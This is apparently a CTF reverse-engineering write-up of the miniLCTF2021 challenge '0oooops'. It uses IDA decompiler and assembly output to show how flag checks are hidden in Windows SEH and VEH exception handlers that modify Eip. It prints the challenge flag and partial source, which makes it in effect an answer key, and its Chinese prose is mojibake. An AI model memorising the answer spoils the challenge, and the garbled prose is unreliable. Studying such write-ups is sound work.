<h3 id="CONTEXT"><a href="#CONTEXT" class="headerlink" title="CONTEXT"></a>CONTEXT</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_CONTEXT</span> &#123;</span><br><span class="line">    DWORD ContextFlags;</span><br><span class="line">    DWORD   Dr0;                <span class="comment">//0x04</span></span><br><span class="line">    DWORD   Dr1;                <span class="comment">//0x08</span></span><br><span class="line">    DWORD   Dr2;                <span class="comment">//0x0c</span></span><br><span class="line">    DWORD   Dr3;                <span class="comment">//0x10</span></span><br><span class="line">    DWORD   Dr6;                <span class="comment">//0x14</span></span><br><span class="line">    DWORD   Dr7;                <span class="comment">//0x18</span></span><br><span class="line"></span><br><span class="line">    FLOATING_SAVE_AREA FloatSave;</span><br><span class="line"></span><br><span class="line">    DWORD   SegGs;              <span class="comment">//0x88</span></span><br><span class="line">    DWORD   SegFs;              <span class="comment">//0x90</span></span><br><span class="line">    DWORD   SegEs;              <span class="comment">//0x94</span></span><br><span class="line">    DWORD   SegDs;              <span class="comment">//0x98</span></span><br><span class="line"></span><br><span class="line">    DWORD   Edi;                <span class="comment">//0x9c</span></span><br><span class="line">    DWORD   Esi;                <span class="comment">//0xa0</span></span><br><span class="line">    DWORD   Ebx;                <span class="comment">//0xa4</span></span><br><span class="line">    DWORD   Edx;                <span class="comment">//0xa8</span></span><br><span class="line">    DWORD   Ecx;                <span class="comment">//0xac</span></span><br><span class="line">    DWORD   Eax;                <span class="comment">//0xb0</span></span><br><span class="line">    DWORD   Ebp;                <span class="comment">//0xb4</span></span><br><span class="line">    DWORD   Eip;                <span class="comment">//0xb8</span></span><br><span class="line"></span><br><span class="line">    DWORD   SegCs;              <span class="comment">//0xbc MUST BE SANITIZED</span></span><br><span class="line">    DWORD   EFlags;             <span class="comment">//0xc0 MUST BE SANITIZED</span></span><br><span class="line">    DWORD   Esp;                <span class="comment">//0xc4</span></span><br><span class="line">    DWORD   SegSs;              <span class="comment">//0xc8</span></span><br><span class="line"></span><br><span class="line">    BYTE    ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];</span><br><span class="line">&#125; CONTEXT;</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„é‡Œé¢çš„Eipæˆå‘˜(0xb8)<br>ä¸€èˆ¬æ¥è¯´ å½“ä¸€å¥ä»£ç è§¦å‘å¼‚å¸¸æ—¶ EipæŒ‡å‘è¿™å¥ä»£ç ç»“æŸçš„ä½ç½®(ä¾¿äºå¤„ç†å®Œå¼‚å¸¸åèƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œåç»­ä»£ç )<br>ä½†æ˜¯åœ¨å¼‚å¸¸å¤„ç†å‡½æ•°(Handler)ä¸­ å¯ä»¥ä¿®æ”¹CONTEXT-&gt;Eip!(å¯ä»¥ç”¨äºåè°ƒè¯•)</p>
<h2 id="ç»“æ„åŒ–å¼‚å¸¸å¤„ç†å†…éƒ¨å‡½æ•°"><a href="#ç»“æ„åŒ–å¼‚å¸¸å¤„ç†å†…éƒ¨å‡½æ•°" class="headerlink" title="ç»“æ„åŒ–å¼‚å¸¸å¤„ç†å†…éƒ¨å‡½æ•°"></a>ç»“æ„åŒ–å¼‚å¸¸å¤„ç†å†…éƒ¨å‡½æ•°</h2><p>C++æä¾›ä¸¤ä¸ªå¯ç”¨äºtry-exceptå†…éƒ¨çš„å‡½æ•°</p>
<ul>
<li>GetExceptionCode: è¿”å›å¼‚å¸¸å€¼</li>
<li>GetExceptionInformation: è¿”å›ä¸€ä¸ªæŒ‡å‘EXCEPTION_POINTERS ç»“æ„çš„æŒ‡é’ˆ</li>
</ul>
<h3 id="EXCEPTION-POINTERS-ç»“æ„ä½“"><a href="#EXCEPTION-POINTERS-ç»“æ„ä½“" class="headerlink" title="EXCEPTION_POINTERS ç»“æ„ä½“"></a>EXCEPTION_POINTERS ç»“æ„ä½“</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_POINTERS</span> &#123;</span><br><span class="line">  PEXCEPTION_RECORD ExceptionRecord;</span><br><span class="line">  PCONTEXT          ContextRecord;</span><br><span class="line">&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;</span><br></pre></td></tr></table></figure>


<h1 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><p>è¦æ³¨æ„ï¼æœ‰äº›å¼‚å¸¸è§¦å‘æ˜¯æœ‰æ¡ä»¶çš„(æ¯”å¦‚å°†æŸä¸ªå˜é‡&gt;&gt;å¤šå°‘ä½ è¦ç§»ä¸º0åæ‰ä¼šè§¦å‘é™¤é›¶å¼‚å¸¸(è¿™æ—¶ä¸€èˆ¬åœ¨Handleré‡Œéƒ½æœ‰å¯¹å…³é”®å˜é‡çš„æ“ä½œ) )<br>ä¸€äº›å°æŠ€å·§:</p>
<ul>
<li>é€‰ä¸­å˜é‡æŒ‰Y è¾“å…¥æ­£ç¡®ç±»å‹è®©IDAæ›´å¥½è¯†åˆ«</li>
<li>é€‰ä¸­æŸäº›å¸¸é‡å€¼æŒ‰M IDAä¼šè‡ªåŠ¨è½¬ä¸ºå® (æ¯”å¦‚ EXCEPTION_ACCESS_VIOLATION) çš„å½¢å¼</li>
</ul>
<h2 id="miniLCTF2021-0oooops"><a href="#miniLCTF2021-0oooops" class="headerlink" title="miniLCTF2021 0oooops"></a>miniLCTF2021 0oooops</h2><p>IDAæ‰“å¼€</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE v4[<span class="number">108</span>]; <span class="comment">// [esp+E0h] [ebp-F0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">104</span>]; <span class="comment">// [esp+14Ch] [ebp-84h] BYREF</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+1B8h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">j_memset</span>(Str, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;Please input your flag: &quot;</span>);</span><br><span class="line">  <span class="built_in">j_memset</span>(&amp;v4[<span class="number">25</span>], <span class="number">0</span>, <span class="number">0x4B</span>u);</span><br><span class="line">  <span class="built_in">sub_2D10DC</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)v4);</span><br><span class="line">  <span class="built_in">sub_2D1037</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)Str);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">sub_2D12DA</span>(Str) )       <span class="comment">// æ£€æŸ¥æ ¼å¼</span></span><br><span class="line">  &#123;</span><br><span class="line">    MEMORY[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_2D126C</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¾ˆæ˜æ˜¾è§¦å‘äº†ä¸€ä¸ªå†…å­˜è®¿é—®å¼‚å¸¸</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">EXCEPTION_ACCESS_VIOLATION         <span class="number">0xC0000005</span></span><br></pre></td></tr></table></figure>

<p>è½¬åˆ°æ±‡ç¼–æŸ¥çœ‹ å‘ç°é™¤äº†è¿™ä¸ªå¼‚å¸¸å¤–è¿˜è§¦å‘äº†ä¸€ä¸ªé™¤é›¶å¼‚å¸¸</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">002</span>D2330 ;   __try &#123; <span class="comment">// __except at loc_2D2377</span></span><br><span class="line">.text:<span class="number">002</span>D2330                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0</span></span><br><span class="line">.text:<span class="number">002</span>D2337                 lea     ebx, [ebp+Str]</span><br><span class="line">.text:<span class="number">002</span>D233D                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">002</span>D233F                 db      <span class="number">3</span>Eh</span><br><span class="line">.text:<span class="number">002</span>D233F                 mov     dword ptr [eax], <span class="number">0</span></span><br><span class="line">.text:<span class="number">002</span>D2346                 mov     edx, <span class="number">0</span></span><br><span class="line">.text:<span class="number">002</span>D234B                 div     edx             ; é™¤é›¶å¼‚å¸¸!</span><br><span class="line">.text:<span class="number">002</span>D234B ;   &#125; <span class="comment">// starts at 2D2330</span></span><br><span class="line">.text:<span class="number">002</span>D234D                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh</span><br><span class="line">.text:<span class="number">002</span>D2354                 jmp     <span class="type">short</span> loc_2D2381</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå…ˆå¤„ç†çš„æ˜¯é™¤é›¶å¼‚å¸¸(ä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªé¡ºåºè¿˜æ²¡å¼„æ‡‚â€¦) è·³è½¬åˆ°2D2377</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">loc_2D2377:</span><br><span class="line">;   __except(loc_2D2356) <span class="comment">// owned by 2D2330</span></span><br><span class="line">mov     esp, [ebp+ms_exc.old_esp]</span><br><span class="line">mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0F</span>FFFFFFEh</span><br></pre></td></tr></table></figure>
<p>è·Ÿè¿›2D2356</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">loc_2D2356:</span><br><span class="line">;   __except filter <span class="comment">// owned by 2D2330</span></span><br><span class="line">mov     eax, [ebp+ms_exc.exc_ptr]</span><br><span class="line">mov     ecx, [eax]</span><br><span class="line">mov     edx, [ecx]</span><br><span class="line">mov     [ebp+var_1BC], edx</span><br><span class="line">mov     eax, [ebp+ms_exc.exc_ptr]</span><br><span class="line">push    eax</span><br><span class="line">mov     ecx, [ebp+var_1BC]</span><br><span class="line">push    ecx</span><br><span class="line">call    sub_2D1131</span><br><span class="line">add     esp, <span class="number">8</span></span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹è¿™ä¸ªsub_2D1131è·Ÿè¿›åˆ°</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_411DD0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+104h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41D015);</span><br><span class="line">  <span class="keyword">if</span> ( **(_DWORD **)a2 != <span class="number">-1073741676</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = *(_DWORD *)(*(_DWORD *)(a2 + <span class="number">4</span>) + <span class="number">164</span>) + <span class="number">9</span>;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(v4, <span class="string">&quot;!V -&#125;VG-bp&#125;m-nG!b|ra GyGE|Drp D&quot;</span>, <span class="number">31</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != ((<span class="type">unsigned</span> __int8)*(_DWORD *)(*(_DWORD *)(a2 + <span class="number">4</span>) + <span class="number">184</span>) ^ ((*(<span class="type">char</span> *)(v5 + <span class="number">2</span> * i + <span class="number">1</span>) ^ <span class="number">0x4D</span>) - <span class="number">4</span>) ^ <span class="number">0x13</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(*(_DWORD *)(a2 + <span class="number">4</span>) + <span class="number">184</span>) += <span class="number">54</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_DWORD *)(*(_DWORD *)(a2 + <span class="number">4</span>) + <span class="number">184</span>) += <span class="number">63</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°è¿™é‡Œç‰¹åˆ«ä¹± ä¸»è¦æ˜¯å› ä¸ºa2çš„ç±»å‹è¿˜æ˜¯DWORDå¯¼è‡´IDAæ²¡åŠæ³•å‡†ç¡®è¯†åˆ«ç»“æ„<br>é€šè¿‡-1073741676(0xC0000094) å¯ä»¥çŸ¥é“è¿™æ˜¯FILTER é‚£ä¹ˆa2çš„ç±»å‹å°±åº”è¯¥ä¸º _EXCEPTION_POINTERS *a2<br>åœ¨IDAé€‰ä¸­a2 æŒ‰Y æ”¹ä¸º _EXCEPTION_POINTERS *a2 ä¿®æ”¹a2ç±»å‹ æ–¹ä¾¿ç¨‹åºè¯†åˆ«<br>ä¿®æ”¹a2ç±»å‹åä»£ç </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_2D1DD0</span><span class="params">(<span class="type">int</span> a1, _EXCEPTION_POINTERS *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-34h] BYREF</span></span><br><span class="line">  DWORD v5; <span class="comment">// [esp+104h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_2DD015);</span><br><span class="line">  <span class="keyword">if</span> ( a2-&gt;ExceptionRecord-&gt;ExceptionCode != <span class="number">0xC0000094</span> )<span class="comment">// EXCEPTION FILTER!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                                   <span class="comment">// è¿™é‡ŒæŠŠa2ç±»å‹è½¬æ¢ä¸º _EXCEPTION_POINTERS *a2 æ–¹ä¾¿IDAè¯†åˆ«</span></span><br><span class="line">  v5 = a2-&gt;ContextRecord-&gt;Ebx + <span class="number">9</span>;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(v4, <span class="string">&quot;!V -&#125;VG-bp&#125;m-nG!b|ra GyGE|Drp D&quot;</span>, <span class="number">31</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != ((<span class="type">unsigned</span> __int8)a2-&gt;ContextRecord-&gt;Eip ^ ((*(<span class="type">char</span> *)(v5 + <span class="number">2</span> * i + <span class="number">1</span>) ^ <span class="number">0x4D</span>) - <span class="number">4</span>) ^ <span class="number">0x13</span>) )<span class="comment">// å¥‡æ•°å­—ç¬¦åŠ å¯†</span></span><br><span class="line">    &#123;                                           <span class="comment">// è¿™é‡Œçš„EipæŒ‡å‘__tryå—ç»“æŸçš„åœ°å€ 002D234B æ‰€ä»¥å–4B(æœ€åä¸€å­—èŠ‚)</span></span><br><span class="line">      a2-&gt;ContextRecord-&gt;Eip += <span class="number">54</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  a2-&gt;ContextRecord-&gt;Eip += <span class="number">63</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±æ¸…æ™°å¤šäº†<br>è¿™ä¸ªå‡½æ•°å¯¹è¾“å…¥å­—ç¬¦çš„å¥‡æ•°ä½è¿›è¡Œäº†åŠ å¯† check<br>é€†å›å»éœ€è¦çŸ¥é“è¿™é‡Œ (unsigned __int8)a2-&gt;ContextRecord-&gt;Eip çš„å€¼<br>è¿™ä¸ªå€¼æŒ‡å‘çš„æ˜¯__tryå—ç»“æŸçš„åœ°å€ IDAæ‰¾åˆ°</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00412330</span> ;   __try &#123; <span class="comment">// __except at loc_412377</span></span><br><span class="line">.text:<span class="number">00412330</span>                 mov     [ebp+ms_exc.registration.TryLevel], <span class="number">0</span></span><br><span class="line">.text:<span class="number">00412337</span>                 lea     ebx, [ebp+Str]</span><br><span class="line">.text:<span class="number">0041233</span>D                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">0041233F</span>                 db      <span class="number">3</span>Eh</span><br><span class="line">.text:<span class="number">0041233F</span>                 mov     dword ptr [eax], <span class="number">0</span></span><br><span class="line">.text:<span class="number">00412346</span>                 mov     edx, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0041234B</span>                 div     edx</span><br><span class="line">.text:<span class="number">0041234B</span> ;   &#125; <span class="comment">// starts at 412330</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œç»“æŸä½ç½®ä¸º 41234B é‚£ä¹ˆå–unsigned int8 å°±æ˜¯ 4B æ‰€ä»¥xorçš„å€¼ä¸º0x4B</p>
<p>é‚£å†…å­˜å¼‚å¸¸å‘¢ï¼Ÿï¼Ÿï¼Ÿ<br>æ•é”çš„å¯ä»¥å‘ç°è¿™é‡Œæœ‰ä¸ªTlsCallback_0_0</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID __stdcall <span class="title">TlsCallback_0_0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41D015);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1u</span>, Handler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥é€šè¿‡è¿™ä¸ªVEHæœºåˆ¶(tcl è¿˜ä¸ä¼šâ€¦) æ¥å¤„ç†çš„è¿™ä¸ªå†…å­˜å¼‚å¸¸<br>æŸ¥çœ‹Handler</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">sub_411BD0</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+104h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41D015);</span><br><span class="line">  <span class="keyword">if</span> ( **(_DWORD **)a1 != <span class="number">-1073741819</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = *(_DWORD *)(*(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">164</span>) + <span class="number">9</span>;</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">6</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">7</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">8</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">9</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">10</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">11</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">12</span>] = <span class="number">33</span>;</span><br><span class="line">  v3[<span class="number">13</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">14</span>] = <span class="number">72</span>;</span><br><span class="line">  v3[<span class="number">15</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">16</span>] = <span class="number">6</span>;</span><br><span class="line">  v3[<span class="number">17</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">18</span>] = <span class="number">17</span>;</span><br><span class="line">  v3[<span class="number">19</span>] = <span class="number">69</span>;</span><br><span class="line">  v3[<span class="number">20</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">21</span>] = <span class="number">62</span>;</span><br><span class="line">  v3[<span class="number">22</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">23</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">24</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">25</span>] = <span class="number">72</span>;</span><br><span class="line">  v3[<span class="number">26</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">27</span>] = <span class="number">69</span>;</span><br><span class="line">  v3[<span class="number">28</span>] = <span class="number">33</span>;</span><br><span class="line">  v3[<span class="number">29</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">30</span>] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3[i] != (((*(<span class="type">char</span> *)(v4 + <span class="number">2</span> * i) ^ <span class="number">0x37</span>) + <span class="number">4</span>) ^ <span class="number">0x42</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(*(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">184</span>) += <span class="number">66</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_DWORD *)(*(_DWORD *)(a1 + <span class="number">4</span>) + <span class="number">184</span>) += <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†æ¬¡æŠŠa1ä¹Ÿä¿®æ”¹ä¸º_EXCEPTION_POINTERS* ç±»å‹</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">sub_411BD0</span><span class="params">(_EXCEPTION_POINTERS *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-34h]</span></span><br><span class="line">  DWORD v4; <span class="comment">// [esp+104h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41D015);</span><br><span class="line">  <span class="keyword">if</span> ( a1-&gt;ExceptionRecord-&gt;ExceptionCode != <span class="number">0xC0000005</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = a1-&gt;ContextRecord-&gt;Ebx + <span class="number">9</span>;</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">6</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">7</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">8</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">9</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">10</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">11</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">12</span>] = <span class="number">33</span>;</span><br><span class="line">  v3[<span class="number">13</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">14</span>] = <span class="number">72</span>;</span><br><span class="line">  v3[<span class="number">15</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">16</span>] = <span class="number">6</span>;</span><br><span class="line">  v3[<span class="number">17</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">18</span>] = <span class="number">17</span>;</span><br><span class="line">  v3[<span class="number">19</span>] = <span class="number">69</span>;</span><br><span class="line">  v3[<span class="number">20</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">21</span>] = <span class="number">62</span>;</span><br><span class="line">  v3[<span class="number">22</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">23</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">24</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">25</span>] = <span class="number">72</span>;</span><br><span class="line">  v3[<span class="number">26</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">27</span>] = <span class="number">69</span>;</span><br><span class="line">  v3[<span class="number">28</span>] = <span class="number">33</span>;</span><br><span class="line">  v3[<span class="number">29</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">30</span>] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3[i] != (((*(<span class="type">char</span> *)(v4 + <span class="number">2</span> * i) ^ <span class="number">0x37</span>) + <span class="number">4</span>) ^ <span class="number">0x42</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      a1-&gt;ContextRecord-&gt;Eip += <span class="number">66</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  a1-&gt;ContextRecord-&gt;Eip += <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯å¯¹è¾“å…¥çš„å¶æ•°å­—ç¬¦è¿›è¡Œäº†åŠ å¯† check ç›´æ¥é€†å°±è¡Œäº†<br>è¿™é‡Œè´´ä¸€ä»½æºç  ä¾›ä»”ç»†åˆ†æå­¦ä¹ :</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// flagÎª miniLctf&#123;y0u_a1r4ady_und4rstand_th4_w1nd0ws_exc4pt1On_handl1e_m4chan1sm&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> NTAPI <span class="title">VectExcepHandler</span><span class="params">(PEXCEPTION_POINTERS pExcepInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//ï¿½ï¿½Ö¤flagï¿½ï¿½Å¼ï¿½ï¿½Î»</span></span><br><span class="line">		<span class="type">char</span>* _flag = (<span class="type">char</span>*)(pExcepInfo-&gt;ContextRecord-&gt;Ebx + <span class="number">9</span>);</span><br><span class="line">		<span class="type">char</span> _enc1[] = &#123; <span class="number">16</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">21</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">31</span>, <span class="number">46</span>, <span class="number">33</span>, <span 